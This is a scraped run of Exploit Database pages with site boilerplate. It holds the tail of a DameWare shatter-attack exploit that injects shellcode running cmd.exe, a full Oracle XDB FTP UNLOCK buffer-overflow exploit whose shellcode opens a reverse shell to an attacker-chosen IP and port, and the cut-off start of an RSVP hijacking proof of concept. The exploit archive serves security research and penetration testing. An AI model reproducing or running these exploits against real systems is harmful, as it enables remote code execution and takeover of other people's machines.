=0x90;count ++;}buffer[37]=0x8B; buffer[38]=0xE5; buffer[39]=0x55;buffer[40]=0x8B; buffer[41]=0xEC; buffer[42]=0x33;buffer[43]=0xFF; buffer[44]=0x90; buffer[45]=0x57;buffer[46]=0x83; buffer[47]=0xEC; buffer[48]=0x04;buffer[49]=0xC6; buffer[50]=0x45; buffer[51]=0xF8;buffer[52]=0x63; buffer[53]=0xC6; buffer [54]=0x45;buffer[55]=0xF9; buffer[56]=0x6D; buffer [57]=0xC6;buffer[58]=0x45; buffer[59]=0xFA; buffer[60]=0x64;buffer[61]=0xC6; buffer[62]=0x45; buffer[63]=0xFB;buffer[64]=0x2E; buffer[65]=0xC6; buffer[66]=0x45;buffer[67]=0xFC; buffer[68]=0x65; buffer[69]=0xC6;buffer[70]=0x45; buffer[71]=0xFD; buffer [72]=0x78;buffer[73]=0xC6; buffer[74]=0x45; buffer [75] =0xFE;buffer[76]=0x65;hCRT = LoadLibrary("msvcrt.dll");lpSystem = GetProcAddress( hCRT, "system" );buffer[77]=0xB8;buffer[78]=((char *)&lpSystem) [0];buffer[79]=((char *)&lpSystem) [1];buffer[80]=((char *)&lpSystem) [2];buffer[81]=((char *)&lpSystem) [3];buffer [82] =0x50; buffer[83]=0x8D; buffer[84]=0x45;buffer[85]=0xF8; buffer[86]=0x50; buffer[87]=0xFF;buffer [88]=0x55; buffer[89]=0xF4;count = 90;while (count < 291){buffer [count] =0x90;count ++;}buffer[291]=0x24; buffer[292]=0xF1; buffer [293]=0x5D;buffer[294]=0x01; buffer[295]=0x26; buffer[296]=0xF1;buffer [297] =0x5D; buffer[298]=0x01; buffer[299]=0x00;buffer[300]=0x00;return;}void ErrorNotify(DWORD err, char *title){LPVOID lpMsgBuf;FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,err,MAKELANGID (LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language(LPTSTR) &lpMsgBuf,0,NULL) ;printf("%s\n",lpMsgBuf);LocalFree( lpMsgBuf );};#define SHELLCODE_SIZE (1024 * 256)#define SHELLCODE_OFFSET (SHELLCODE_SIZE -400)int main(int argc, char* argv[]){HWND hWnd;HWND hWndChild;char sc[SHELLCODE_SIZE];char szWindowName[] = "About DameWare Mini Remote Control Server";LONG lExecAddress;sc[0] = 'x'; sc[1] = 'e'; sc[2] = 'n'; sc[3] = '0';memset( &sc[4], 0x90, SHELLCODE_SIZE -4);MakeShellCode( &sc[SHELLCODE_OFFSET] );printf( "\nfm-shatterdame.c\nash@felinemenace.org\n" );printf("--------------------------------------------------------------\n");printf("Exploits shatter attack in DameWare Mini Remote ControlServer\n");printf("This is based on shards.cpp written by xenophile.\n") ;printf("--------------------------------------------------------------\n");printf("STEP 1: Finding our window!\n") ;hWnd = FindWindow( NULL, szWindowName );if( hWnd == NULL){printf("Couldn't find the dameware about dialogue. Open it and re-runthis\n");return 0;}hWndChild = FindWindowEx(hWnd, NULL, "Edit", NULL);if( hWndChild == NULL){printf("\tCouldn't find child edit control window\n");return 0;}SendMessage( hWndChild, EM_SETREADONLY, 0, 0 );SendMessage( hWndChild, EM_SETLIMITTEXT, SHELLCODE_SIZE, 0L );if ( ! SendMessage( hWndChild, WM_SETTEXT, 0, (LPARAM)sc ) ) {ErrorNotify ( GetLastError (), "error");}printf("\n\nSTEP 2: Enter shell code address. ""This can be found using a debugger.") ;printf( "\nOn my XP SP1 machine 0x160000 worked.\n" );printf( "\n\nEnter execution address: " );scanf( "%x", &lExecAddress );if ( ! SendMessage( hWndChild, EM_SETWORDBREAKPROC, 0L,(LPARAM)lExecAddress ) ) {ErrorNotify( GetLastError(), "error" );}SendMessage( hWndChild, WM_LBUTTONDBLCLK, MK_LBUTTON,(LPARAM)0x000a000a );return 0;}// milw0rm.com [2003-08-13]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 80
Oracle XDB FTP Service - UNLOCK Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDOracle XDB FTP Service - UNLOCK Buffer OverflowEDB-ID:80CVE:2003-0727EDB Verified:Author:David LitchfieldType:remoteExploit:/Platform:WindowsDate:2003-08-13Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*  Oracle XDB FTP Service UNLOCK Buffer Overflow Exploit *//*    David Litchfield from ngssoftware (at Blackhat 2003)*//*                                                        *//*  Original Advisory :                                   *//*  http://www.blackhat.com/presentations/bh-usa-03/bh-   *//*  us-03-litchfield-paper.pdf                            */#include <stdio.h>#include <windows.h>#include <winsock.h>int GainControlOfOracle(char *, char *);int StartWinsock(void);int SetUpExploit(char *,int);struct sockaddr_in s_sa;struct hostent *he;unsigned int addr;char host[260]="";unsigned char exploit[508]="\x55\x8B\xEC\xEB\x03\x5B\xEB\x05\xE8\xF8\xFF\xFF\xFF\xBE\xFF\xFF""\xFF\xFF\x81\xF6\xDC\xFE\xFF\xFF\x03\xDE\x33\xC0\x50\x50\x50\x50""\x50\x50\x50\x50\x50\x50\xFF\xD3\x50\x68\x61\x72\x79\x41\x68\x4C""\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\xFF\x75\xFC\xFF\x55\xF4\x89""\x45\xF0\x83\xC3\x63\x83\xC3\x5D\x33\xC9\xB1\x4E\xB2\xFF\x30\x13""\x83\xEB\x01\xE2\xF9\x43\x53\xFF\x75\xFC\xFF\x55\xF4\x89\x45\xEC""\x83\xC3\x10\x53\xFF\x75\xFC\xFF\x55\xF4\x89\x45\xE8\x83\xC3\x0C""\x53\xFF\x55\xF0\x89\x45\xF8\x83\xC3\x0C\x53\x50\xFF\x55\xF4\x89""\x45\xE4\x83\xC3\x0C\x53\xFF\x75\xF8\xFF\x55\xF4\x89\x45\xE0\x83""\xC3\x0C\x53\xFF\x75\xF8\xFF\x55\xF4\x89\x45\xDC\x83\xC3\x08\x89""\x5D\xD8\x33\xD2\x66\x83\xC2\x02\x54\x52\xFF\x55\xE4\x33\xC0\x33""\xC9\x66\xB9\x04\x01\x50\xE2\xFD\x89\x45\xD4\x89\x45\xD0\xBF\x0A""\x01\x01\x26\x89\x7D\xCC\x40\x40\x89\x45\xC8\x66\xB8\xFF\xFF\x66""\x35\xFF\xCA\x66\x89\x45\xCA\x6A\x01\x6A\x02\xFF\x55\xE0\x89\x45""\xE0\x6A\x10\x8D\x75\xC8\x56\x8B\x5D\xE0\x53\xFF\x55\xDC\x83\xC0""\x44\x89\x85\x58\xFF\xFF\xFF\x83\xC0\x5E\x83\xC0\x5E\x89\x45\x84""\x89\x5D\x90\x89\x5D\x94\x89\x5D\x98\x8D\xBD\x48\xFF\xFF\xFF\x57""\x8D\xBD\x58\xFF\xFF\xFF\x57\x33\xC0\x50\x50\x50\x83\xC0\x01\x50""\x83\xE8\x01\x50\x50\x8B\x5D\xD8\x53\x50\xFF\x55\xEC\xFF\x55\xE8""\x60\x33\xD2\x83\xC2\x30\x64\x8B\x02\x8B\x40\x0C\x8B\x70\x1C\xAD""\x8B\x50\x08\x52\x8B\xC2\x8B\xF2\x8B\xDA\x8B\xCA\x03\x52\x3C\x03""\x42\x78\x03\x58\x1C\x51\x6A\x1F\x59\x41\x03\x34\x08\x59\x03\x48""\x24\x5A\x52\x8B\xFA\x03\x3E\x81\x3F\x47\x65\x74\x50\x74\x08\x83""\xC6\x04\x83\xC1\x02\xEB\xEC\x83\xC7\x04\x81\x3F\x72\x6F\x63\x41""\x74\x08\x83\xC6\x04\x83\xC1\x02\xEB\xD9\x8B\xFA\x0F\xB7\x01\x03""\x3C\x83\x89\x7C\x24\x44\x8B\x3C\x24\x89\x7C\x24\x4C\x5F\x61\xC3""\x90\x90\x90\xBC\x8D\x9A\x9E\x8B\x9A\xAF\x8D\x90\x9C\x9A\x8C\x8C""\xBE\xFF\xFF\xBA\x87\x96\x8B\xAB\x97\x8D\x9A\x9E\x9B\xFF\xFF\xA8""\x8C\xCD\xA0\xCC\xCD\xD1\x9B\x93\x93\xFF\xFF\xA8\xAC\xBE\xAC\x8B""\x9E\x8D\x8B\x8A\x8F\xFF\xFF\xA8\xAC\xBE\xAC\x90\x9C\x94\x9A\x8B""\xBE\xFF\xFF\x9C\x90\x91\x91\x9A\x9C\x8B\xFF\x9C\x92\x9B\xFF\xFF""\xFF\xFF\xFF\xFF";char exploit_code[8000]="UNLOCK / aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnn""nooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAAAABBBBCCCCD""DDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSST""TTTUUUUVVVVWWWWXXXXYYYYZZZZabcdefghijklmnopqrstuvwxyzABCDEFGHIJK""LMNOPQRSTUVWXYZ0000999988887777666655554444333322221111098765432""1aaaabbbbcc";char exception_handler[8]="\x79\x9B\xf7\x77";char short_jump[8]="\xEB\x06\x90\x90";int main(int argc, char *argv[]){if(argc != 6){printf("\n\n\tOracle XDB FTP Service UNLOCK Buffer Overflow Exploit");printf("\n\t\tfor Blackhat (http://www.blackhat.com)");printf("\n\n\tSpawns a reverse shell to specified port");printf("\n\n\tUsage:\t%s host userid password ipaddress port",argv[0]);printf("\n\n\tDavid Litchfield\n\t(david@ngssoftware.com)");printf("\n\t6th July 2003\n\n\n");return 0;}strncpy(host,argv[1],250);if(StartWinsock()==0)return printf("Error starting Winsock.\n");SetUpExploit(argv[4],atoi(argv[5]));strcat(exploit_code,short_jump);strcat(exploit_code,exception_handler);strcat(exploit_code,exploit);strcat(exploit_code,"\r\n");GainControlOfOracle(argv[2],argv[3]);return 0;}int SetUpExploit(char *myip, int myport){unsigned int ip=0;unsigned short prt=0;char *ipt="";char *prtt="";ip = inet_addr(myip);ipt = (char*)&ip;exploit[191]=ipt[0];exploit[192]=ipt[1];exploit[193]=ipt[2];exploit[194]=ipt[3];// set the TCP port to connect on// netcat should be listening on this port// e.g. nc -l -p 80prt = htons((unsigned short)myport);prt = prt ^ 0xFFFF;prtt = (char *) &prt;exploit[209]=prtt[0];exploit[210]=prtt[1];return 0;}int StartWinsock() {int err=0; WORD wVersionRequested;WSADATA wsaData;wVersionRequested = MAKEWORD( 2, 0 );err = WSAStartup( wVersionRequested, &wsaData );if ( err != 0 )return 0;if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 ){ WSACleanup( );return 0; }if (isalpha(host[0])) {he = gethostbyname(host);s_sa.sin_addr.s_addr=INADDR_ANY;s_sa.sin_family=AF_INET;memcpy(&s_sa.sin_addr,he->h_addr,he->h_length);} else{ addr = inet_addr(host);s_sa.sin_addr.s_addr=INADDR_ANY;s_sa.sin_family=AF_INET;memcpy(&s_sa.sin_addr,&addr,4);he = (struct hostent *)1;}if (he == NULL) {return 0; }return 1; }int GainControlOfOracle(char *user, char *pass) {char usercmd[260]="user ";char passcmd[260]="pass ";char resp[1600]="";int snd=0,rcv=0;struct sockaddr_in r_addr;SOCKET sock;strncat(usercmd,user,230);strcat(usercmd,"\r\n");strncat(passcmd,pass,230);strcat(passcmd,"\r\n");sock=socket(AF_INET,SOCK_STREAM,0);if (sock==INVALID_SOCKET)return printf(" sock error");r_addr.sin_family=AF_INET; r_addr.sin_addr.s_addr=INADDR_ANY;r_addr.sin_port=htons((unsigned short)0);s_sa.sin_port=htons((unsigned short)2100);if (connect(sock,(LPSOCKADDR)&s_sa,sizeof(s_sa))==SOCKET_ERROR) return printf("Connect error");rcv = recv(sock,resp,1500,0);printf("%s",resp);ZeroMemory(resp,1600);snd=send(sock, usercmd , strlen(usercmd) , 0);rcv = recv(sock,resp,1500,0);printf("%s",resp); ZeroMemory(resp,1600);snd=send(sock, passcmd , strlen(passcmd) , 0);rcv = recv(sock,resp,1500,0);printf("%s",resp);if(resp[0]=='5'){ closesocket(sock);return printf("Failed to log in using user %s and password %s.\n",user,pass);}ZeroMemory(resp,1600);snd=send(sock, exploit_code, strlen(exploit_code) , 0);Sleep(2000);closesocket(sock);return 0;}// milw0rm.com [2003-08-13]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 81
Microsoft Windows Server 2000 - RSVP Server Authority Hijacking - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows Server 2000 - RSVP Server Authority HijackingEDB-ID:81CVE:EDB Verified:Author:ste jonesType:remoteExploit:/Platform:WindowsDate:2003-08-15Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED// Microsoft Windows 2000 Subnet Bandwidth Manager RSVP Server Authority Hijacking//// A problem has been identified in the RSVP Server for Microsoft Windows 2000 that// may allow an attacker to hijack management of the network. This could allow an// attacker control of network Quality of Service.//// By ste jones root at networkpenetration.com//// Proof of concept code for attack against RSVP / SBM (RFC 2814)// compile: gcc rsvp.c -Wall -o RSVP_DoS// Allows spoofing of source IP with -s// Tested on linux against win2k server// You will need to be root to launch the attack as we are using raw sockets/* RSVP* Resource ReserVation Protocol Munger** multicast IP 224.0.0.17* IP protocol number 0x2e for RSVP** RSVP Header* Version = 4bits* flags = 4 bits* message type = 8 bits = 67 = I_AM_DSBM* RSVP checksum = 16 bits = set to 0's* TTL = 8 bits = 1 on multicast* Reserved = 8 bits* RSVP length = 16 bits* + data** Data header* Length = 16 bits* Class = 8 bits* type = 8 bits* Obj contents*//**Proof of concept - doesnt check if RSVP priority of server assumes lower*/#include <netinet/in.h>#include <stdlib.h>#include <unistd.h>#include 